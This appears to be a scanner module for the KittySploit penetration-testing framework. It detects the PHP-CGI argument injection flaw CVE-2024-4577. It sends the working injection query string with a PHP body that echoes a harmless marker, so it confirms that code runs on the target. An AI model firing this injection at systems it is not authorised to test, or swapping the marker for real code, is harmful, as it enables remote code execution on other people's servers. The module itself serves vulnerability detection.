#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "PHP CGI Argument Injection (CVE-2024-4577) detection",
        "description": (
            "Detects CVE-2024-4577 by probing PHP-CGI argument injection with a harmless PHP marker "
            "via auto_prepend_file=php://input."
        ),
        "author": ["Orange Tsai", "watchTowr", "KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2024-4577",
        "references": [
            "https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/",
            "https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/",
        ],
        "modules": [
            "exploits/linux/http/php_cgi_cve_2024_4577_rce",
        ],
        "tags": ["web", "scanner", "php", "cgi", "argument-injection", "rce"],
    }

    target_path = OptString("/index.php", "Path to PHP-CGI entrypoint", required=False)
    verify_marker = OptString("1337", "Marker used for safe probe", required=False, advanced=True)
    active_probe = OptBool(True, "Send active marker probe (recommended)", required=False)

    CGI_ARG_INJECTION = "?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"

    def _build_path(self) -> str:
        p = str(self.target_path or "/index.php").strip()
        if not p.startswith("/"):
            p = "/" + p
        return p

    def _probe(self, marker: str):
        body = f"<?php echo {marker!r}; die; ?>"
        return self.http_request(
            method="POST",
            path=f"{self._build_path()}{self.CGI_ARG_INJECTION}",
            data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=max(int(self.timeout or 10), 10),
            allow_redirects=False,
        )

    def run(self):
        try:
            if not self.active_probe:
                root = self.http_request(method="GET", path="/", timeout=10, allow_redirects=True)
                if root and "php" in (
                    (root.headers.get("X-Powered-By", "") + root.headers.get("Server", "")).lower()
                ):
                    self.set_info(
                        severity="medium",
                        cve="CVE-2024-4577",
                        reason="PHP detected, but active CVE-2024-4577 probe disabled",
                    )
                    return True
                return False

            marker = str(self.verify_marker or "1337")
            response = self._probe(marker)
            if not response:
                return False

            if response.status_code in (200, 500) and marker in (response.text or ""):
                self.set_info(
                    severity="critical",
                    cve="CVE-2024-4577",
                    reason=f"Marker {marker!r} executed via PHP-CGI argument injection",
                )
                return True

            return False
        except Exception:
            return False
